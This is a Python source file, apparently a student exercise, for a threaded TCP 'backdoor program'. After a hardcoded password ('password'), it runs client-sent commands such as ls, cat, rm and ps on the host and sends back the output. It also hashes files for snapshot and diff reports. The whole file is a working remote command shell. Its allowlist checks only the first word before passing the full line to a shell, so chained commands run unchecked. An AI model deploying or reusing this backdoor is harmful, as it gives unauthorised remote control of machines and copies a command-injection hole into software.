#!/usr/bin/python
# -*- coding: utf-8 -*-

# Reference: https://docs.google.com/presentation/d/1HhmFAC_K-y4eSdr400PlGSZUCI6X4dHO_IWi2-Ltg-A/edit#slide=id.g27a05980b3_0_23
import socketserver
import sys
import socket
import threading
import subprocess
import hashlib
import os
import io

writer = io.StringIO()
class MyTCPHandler(socketserver.BaseRequestHandler):
    BUFFER_SIZE = 4096
    socketserver.TCPServer.allow_reuse_address = True

    def handle(self):
        # list of subprocess commands
        subProcessCmd = ["pwd", "cd", "ls", "cp", "mv", "rm", "cat","who", "ps"]
        currentDirectory = os.getcwd()
        # One time authentication set up
        self.request.sendall(bytearray("Identify Yourself\npass: ", 'utf-8'))
        identified = False

        while 1:
            shouldPrint = True
            if identified:
                self.request.sendall(bytearray("> ", 'utf-8'))

            data = self.request.recv(self.BUFFER_SIZE)

            if len(data) == self.BUFFER_SIZE:
                while 1:
                    try:  # error means no more data
                        data += self.request.recv(self.BUFFER_SIZE,
                                socket.MSG_DONTWAIT)
                    except:
                        break


            # check if no data
            if len(data) == 0:
                break
            data = data.decode('utf-8')
            data = data.strip()            



            # if not identified then do it once
            if(not identified):
                if(data == "password"):
                    self.request.sendall(bytearray("Welcome\n", 'utf-8'))
                    identified = True
                    continue
                else:
                    self.request.sendall(bytearray("Invalid password\n", 'utf-8'))
                    sys.exit(0)



            # Off command, terminating server
            if(data.lower() == "off"):
                self.request.sendall(bytearray("I am terminating my self. Good Bye... \n", 'utf-8'))
                server.shutdown()
                break




            # Logout command, logs out client    
            elif(data.lower() == "logout"):
                self.request.sendall(bytearray("Logging out \n", 'utf-8'))
                sys.exit(0)


            
            elif("help" in data):
                self.helpFunction(data)



            # check and perform subprocess commands
            elif(data.lower().split(" ")[0] in subProcessCmd):
                # run command and gather all output in memory

                try:
                    # Check if the command is cd
                    if(data.lower().split(" ")[0] == "cd"):
                        # check if a path is specified
                        if(len(data.strip().split(" ")) > 1):
                            newPath = currentDirectory + "/" +data.split(" ",1)[1]

                            # if path doesnt exist then notify that it is the wrong directory
                            if not os.path.exists(newPath):
                                self.request.sendall(bytearray("Wrong directory\n", 'utf-8')) 
                                shouldPrint = False

                            else:
                                currentDirectory = newPath
                        else:
                            self.request.sendall(bytearray("Please provide with a path\n", 'utf-8')) 
                            shouldPrint = False
                   
                    output = subprocess.run(data, shell=True, stdout=subprocess.PIPE, cwd = currentDirectory).stdout
                    # send output of the process to client
                    self.request.sendall(bytearray(output.decode("utf-8"), 'utf-8'))

                    # If no feedback then give a basic feedback
                    if(output.decode("utf-8") == "" and shouldPrint == True):
                        self.request.sendall(bytearray("Command had been Executed\n", 'utf-8'))
                    
                except subprocess.SubprocessError:
                    self.request.sendall(bytearray("Command Cannot be Executed\n", 'utf-8'))




            # Calls the digest function and writes it to memory. Clears the previous file
            # Reference: http://pythoncentral.io/how-to-traverse-a-directory-tree-in-python-guide-to-os-walk/
            elif(data.lower() == "snap"):
                # clear the snapshot
                writer.truncate(0)
                writer.write(self.calculateDigest(currentDirectory))



            # Calculates diff
            # Reference: https://stackoverflow.com/questions/12807079/how-to-determined-if-a-2-dimensional-list-contain-a-value
            elif(data.lower() == "diff"):
                snap = writer.getvalue()

                #if there are no snapshots then send the error
                if(snap != ""):
                    # Turn string into array
                    content = self.calculateDigest(currentDirectory)
                    contentArr = self.makeArray(content)
                    snapArr = self.makeArray(snap)

                    # Compare content array with snap array
                    for elem in contentArr:

                        # If no file that exist in content array exist in snapArr then it was added
                        if not any(elem[0] in sublist for sublist in snapArr):

                        # If a file exist in content array and snapArr but digest is different then it was modified
                            self.request.sendall(bytearray(elem[0]+ " - was added\n", 'utf-8'))
                        if (any(elem[0] in sublist for sublist in snapArr) and not any(elem[1] in sublist1 for sublist1 in snapArr)):
                            self.request.sendall(bytearray(elem[0]+ " - was modified\n", 'utf-8'))

                    for elem in snapArr:
                        # If no file that exist in snap array exist in content array then it was deleted
                        if not any(elem[0] in sublist for sublist in contentArr):
                            self.request.sendall(bytearray(elem[0]+ " - was deleted\n", 'utf-8'))

                else:
                    self.request.sendall(bytearray("Error: No snapshot\n", 'utf-8'))

            else:
                self.request.sendall(bytearray("Invalid command\n", 'utf-8'))


    def makeArray(client, content):
        contentLine = content.strip().split("\n")
        contentArr = []
        counter = 0
        for elem in contentLine:
            arr = elem.strip().split(" ")
            contentArr.append([arr[0], arr[1]])
            counter += 1
        return contentArr


    # Calcualtes the sha256 digest
    def calculateDigest(client, currentDirectory):
        # Shell command
        output = subprocess.run("ls", shell=True, stdout=subprocess.PIPE, cwd = currentDirectory).stdout
        output = output.decode('utf-8').strip()
        output = output.split("\n")
        
        # holder for the digest
        hashDigest = ""
        # Check all of the files in the current directory and the subdirectories 
        for dirName, subdirList, fileList in os.walk(currentDirectory):
            for fname in fileList:
                try:
                    # opening the file and calcuating the digest and appending it to the holder variable
                    f = open(dirName + "/" + fname, "rb")
                    sha = hashlib.sha256()
                    while True:
                        data = f.read(4096)
                        if not data:
                            break
                        sha.update(data)
                    f.close()
                    hashDigest += (fname + " " + sha.hexdigest() + "\n")

                except IOError:
                    print('err ' + fname)
        # return the whole thing
        return hashDigest



    # Function that takes in 2 parameter, the client and the command and returns appropriate result
    def helpFunction(info, cmd):
        help = cmd.split(" ")
        if(len(help) == 1):
            info.request.sendall(bytearray("supported commands:\n    pwd, cd, cwd, ls, cp, rm, mv, cat, snap, diff, off, who, ps \n", 'utf-8'))

        else:    
            if(help[1] == "pwd"):
                info.request.sendall(bytearray("return the current working directory\n", 'utf-8'))
            elif(help[1] == "cd"):
                info.request.sendall(bytearray("change the current working directory to <dir>\n", 'utf-8'))
            elif(help[1] == "ls"):
                info.request.sendall(bytearray("list the contents of the current working directory\n", 'utf-8'))
            elif(help[1] == "cp"):
                info.request.sendall(bytearray("copy file1 to file2\n", 'utf-8'))
            elif(help[1] == "mv"):
                info.request.sendall(bytearray("rename file1 to file2\n", 'utf-8'))
            elif(help[1] == "rm"):
                info.request.sendall(bytearray("delete file\n", 'utf-8'))
            elif(help[1] == "cat"):
                info.request.sendall(bytearray("return contents of the file\n", 'utf-8'))
            elif(help[1] == "snap"):
                info.request.sendall(bytearray("""take a snapshot of all the files in the current directory and save it in memory the snapshot should only
                    include the filenames and hashes of the files the snapshot should survive client disconnecting and reconnecting later\n""", 'utf-8'))
            elif(help[1] == "diff"):
                info.request.sendall(bytearray("""compare the contents of the current directory to the saved snapshot, and report differences 
                    (deleted files, new files and changed files) this does not need to be recursive\n""", 'utf-8'))
            elif(help[1] == "help"):
                info.request.sendall(bytearray("print a list of commands, and if given an argument, print more detailed help for the command\n", 'utf-8'))
            elif(help[1] == "logout"):
                info.request.sendall(bytearray("disconnect client (server closes the socket)\n", 'utf-8'))
            elif(help[1] == "off"):
                info.request.sendall(bytearray("terminate the backdoor program\n", 'utf-8'))
            elif(help[1] == "who"):
                info.request.sendall(bytearray("list user[s] currently logged in\n", 'utf-8'))
            elif(help[1] == "ps"):
                info.request.sendall(bytearray("show currently running process\n", 'utf-8'))
            else:
                info.request.sendall(bytearray(help[1] + " does not exist\n", 'utf-8'))






if __name__ == '__main__':
    # Checking if port number is given
    if (len(sys.argv) < 2):
        print("Please provide a port number!!!!")
        sys.exit(0)
    (HOST, PORT) = ('localhost', sys.argv[1])
    
    #checking if port number is valid
    if(PORT.isdigit() == False):
        print("Invalid port number")
        sys.exit(0)
    print ('serving on port ' + PORT)
    server = socketserver.ThreadingTCPServer((HOST, int(PORT)), MyTCPHandler)
    server.serve_forever()



